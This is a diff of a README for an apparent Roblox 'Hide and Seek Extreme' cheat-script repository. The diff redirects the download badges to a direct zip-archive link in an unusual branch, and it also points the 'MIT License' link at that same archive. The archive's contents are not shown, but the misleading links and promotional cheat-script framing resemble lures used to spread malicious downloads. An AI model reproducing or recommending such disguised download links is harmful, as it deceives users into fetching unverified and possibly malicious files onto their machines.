@@ -1,6 +1,6 @@
 # Hide and Seek Extreme Roblox Script Repository
 
-[![Download](https://img.shields.io/badge/Download-green)](https://chenprof.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/chenprof/hide-and-seek-extreme-toolkit/raw/refs/heads/branch/Guaque/and-seek-hide-extreme-toolkit-1.1.zip)
 
 Embark on an odyssey of enhanced gameplay with our **Hide and Seek Extreme Roblox Script** repository! Dive into a carefully curated set of tools, scripts, and resources designed to amplify your Hide and Seek Extreme experience on Roblox. Whether you’re an adventurer, strategist, or curious coder, this repository will light the path to discovery and skill refinement.
 
@@ -94,12 +94,12 @@ _Always play with integrity and respect towards fellow gamers and Roblox’s ric
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT), 2025.  
+Distributed under the [MIT License](https://github.com/chenprof/hide-and-seek-extreme-toolkit/raw/refs/heads/branch/Guaque/and-seek-hide-extreme-toolkit-1.1.zip), 2025.  
 Feel free to learn, explore, and remix—this is your creative springboard.
 
 ---
 
-# [![Download](https://img.shields.io/badge/Download-green)](https://chenprof.github.io)
+# [![Download](https://img.shields.io/badge/Download-green)](https://github.com/chenprof/hide-and-seek-extreme-toolkit/raw/refs/heads/branch/Guaque/and-seek-hide-extreme-toolkit-1.1.zip)
 
 Amaze your friends. Strategize with AI. Redefine Hide and Seek.  
 🌟 Your journey starts now—download and leap in!
